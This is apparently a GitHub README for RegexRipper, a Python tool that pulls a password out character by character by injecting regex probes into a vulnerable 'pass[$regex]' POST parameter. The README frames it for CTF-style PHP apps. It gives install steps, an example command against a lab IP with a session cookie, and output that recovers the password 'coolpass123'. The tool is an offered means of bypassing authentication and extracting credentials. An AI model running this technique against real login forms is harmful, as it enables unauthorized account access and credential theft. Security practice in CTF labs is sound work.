![logo](./logo.png)

**RegexRipper** — A small Python3 tool that discovers a password character-by-character against a vulnerable `pass[$regex]` POST parameter (common in CTF-style vulnerable PHP apps). The tool sends carefully escaped regex probes and detects matches by comparing server responses.

---

## Features

* Detects password length by probing `^.{n}$` patterns.
* Discovers password one character at a time using escaped regex patterns (`re.escape`) to avoid meta-character injection.
* Supports a custom character set (includes letters, digits and a set of special characters by default).
* Optional success-marker substring detection (instead of response-length heuristics).
* Optional request delay to be polite / avoid simple rate-limits.
* Uses `requests.Session` and can accept an initial cookie string (e.g. `PHPSESSID=...`).
* `colorit` used optionally for a nicer banner, but the script runs if `colorit` is not installed.

---

## Installation

```bash
git clone https://github.com/HIJACKED1/Regex_Ripper
cd Regex_Ripper
# Before Run 'install.sh' You Should be upldate Python3 and Pip 
chmod +x install.sh && ./install.sh
```

---

## Validation

```bash
python3 Regex_Ripper.py --url http://10.10.150.52/login.php --user pedro --cookie 'PHPSESSID=qkb3sb***********' --max-len 20


    ____                       ____  _                      
   / __ \___  ____ ____  _  __/ __ \(_)___  ____  ___  _____
  / /_/ / _ \/ __ `/ _ \| |/_/ /_/ / / __ \/ __ \/ _ \/ ___/
 / _, _/  __/ /_/ /  __/>  </ _, _/ / /_/ / /_/ /  __/ /    
/_/ |_|\___/\__, /\___/_/|_/_/ |_/_/ .___/ .___/\___/_/     
           /____/                 /_/   /_/                 
Drink Coffee                                        Author: HIJACKED1

Detecting password length (max 20)...
Password length found: 11
Starting character discovery...
Found so far: c
Found so far: co
Found so far: coo
Found so far: cool
Found so far: coolp
Found so far: coolpa
Found so far: coolpas
Found so far: coolpass
Found so far: coolpass1
Found so far: coolpass12
Found so far: coolpass123
[#] - Full password: coolpass123
```

---
## Secure

* Hash_Script : `c2ead9e3f624bf380f8ab7b7b6606ded`
